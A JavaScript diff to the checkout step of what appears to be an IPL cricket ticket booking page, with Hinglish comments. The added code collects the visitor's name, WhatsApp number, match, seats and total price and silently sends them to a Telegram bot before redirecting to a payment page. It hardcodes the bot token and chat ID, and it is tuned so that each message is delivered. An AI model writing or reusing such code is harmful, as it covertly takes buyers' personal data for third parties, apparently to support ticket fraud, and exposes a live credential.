@@ -71,8 +71,11 @@ document.addEventListener("DOMContentLoaded", async () => {
         localStorage.setItem("seatQuantity", window.sQty);
     }
 
-    // 5. THE BRAHMASTRA - SYNC REDIRECTION
-    window.goNext = () => {
+    // 5. 🔥 THE MASTERSTROKE REDIRECTION FIX 🔥
+    const processNextPage = async (e) => {
+        // YEH LINE BROWSER KO JABARDASTI ROKEGI
+        if (e) e.preventDefault(); 
+
         if (window.sPrice > 0) {
             
             // 1. Button Block
@@ -82,7 +85,7 @@ document.addEventListener("DOMContentLoaded", async () => {
                 btn.style.pointerEvents = "none";
             }
 
-            // 2. FULL SCREEN LOADING OVERLAY DIKHAO (Taaki user ko page ruka hua na lage)
+            // 2. FULL SCREEN LOADING OVERLAY
             const loader = document.createElement('div');
             loader.innerHTML = `
                 <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
@@ -94,43 +97,49 @@ document.addEventListener("DOMContentLoaded", async () => {
             `;
             document.body.appendChild(loader);
 
-            // 3. Thoda sa delay dete hain taaki Loading screen pehle dikh jaye
-            setTimeout(() => {
-                const name = localStorage.getItem('customerName') || "Unknown";
-                const phone = localStorage.getItem('customerPhone') || "Unknown";
-                let matchTitle = "IPL Match";
-                if (matchTitleEl && matchTitleEl.innerText) matchTitle = matchTitleEl.innerText;
-                const totalAmt = window.sQty * window.sPrice;
+            // 3. Get Data for Telegram Alert
+            const name = localStorage.getItem('customerName') || "Unknown";
+            const phone = localStorage.getItem('customerPhone') || "Unknown";
+            let matchTitle = "IPL Match";
+            if (matchTitleEl && matchTitleEl.innerText) matchTitle = matchTitleEl.innerText;
+            const totalAmt = window.sQty * window.sPrice;
 
-                // Aapka Token & Chat ID
-                const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
-                const chatId = "6820660513"; 
-                
-                const telegramMsg = `💰 LEAD REACHED PAYMENT PAGE! 💰\n\n` +
-                                    `👤 Name: ${name}\n` +
-                                    `📞 WhatsApp: ${phone}\n` +
-                                    `🏏 Match: ${matchTitle}\n` +
-                                    `🎟️ Seats: ${window.sQty} x ${window.sType}\n` +
-                                    `💵 Total Amount: ₹${totalAmt}`;
+            // Aapka Original Bot Token aur Aapki Chat ID
+            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
+            const chatId = "6820660513"; 
+            
+            const telegramMsg = `💰 LEAD REACHED PAYMENT PAGE! 💰\n\n` +
+                                `👤 Name: ${name}\n` +
+                                `📞 WhatsApp: ${phone}\n` +
+                                `🏏 Match: ${matchTitle}\n` +
+                                `🎟️ Seats: ${window.sQty} x ${window.sType}\n` +
+                                `💵 Total Amount: ₹${totalAmt}`;
 
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
 
-                // 🔥 4. SYNCHRONOUS REQUEST (Ye browser ko aage badhne se rok dega jab tak message na chala jaye)
-                try {
-                    const xhr = new XMLHttpRequest();
-                    xhr.open("GET", url, false); // 'false' ka matlab hai ki wait karo!
-                    xhr.send(null);
-                } catch (e) {
-                    console.log("TG Send Failed", e);
-                }
+            // 4. AWAIT FETCH - 100% Message Delivery
+            try {
+                await fetch(url);
+            } catch (error) {
+                console.log("TG Failed", error);
+            }
 
-                // 🔥 5. MESSAGE JANE KE BAAD HI REDIRECT HOGA
-                window.location.href = "payment.html";
-
-            }, 200); // 200ms delay taaki spinner screen pe aa sake
+            // 5. MESSAGE BHEJNE KE BAAD HI REDIRECT
+            window.location.href = "payment.html";
 
         } else {
             alert("Kripya pehle seat type select karein!");
         }
     };
+
+    // HTML mein jo onclick="goNext()" likha hai usko yahan se control kar rahe hain
+    window.goNext = (event) => {
+        processNextPage(event);
+    };
+
+    // Agar button direct mil jaye toh usko bhi yahi function de do
+    const finalBtn = document.getElementById('final-btn');
+    if (finalBtn) {
+        finalBtn.addEventListener('click', processNextPage);
+    }
 });
